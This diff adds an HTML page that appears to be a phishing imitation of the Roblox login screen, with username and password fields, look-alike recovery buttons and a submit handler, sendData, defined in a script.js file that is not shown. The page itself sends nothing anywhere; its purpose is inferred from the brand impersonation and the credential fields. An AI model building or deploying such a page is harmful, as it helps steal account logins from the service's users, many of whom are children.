@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="login-container">
+    <h1>Login to Roblox</h1>
+    <form>
+      <input type="text" placeholder="Username/Email/Phone" id="input1" />
+      <input type="password" placeholder="Password" id="input2" />
+      <button onclick="sendData(event)" type="submit">Log In</button>
+    </form>
+    <a href="#" class="forgot-link">Forgot Password or Username?</a>
+    <hr />
+    <button class="alt-btn">Email Me a One-Time Code</button>
+    <button class="alt-btn">Use Another Device</button>
+    <p class="signup-text">Don't have an account? <a href="#">Sign Up</a></p>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
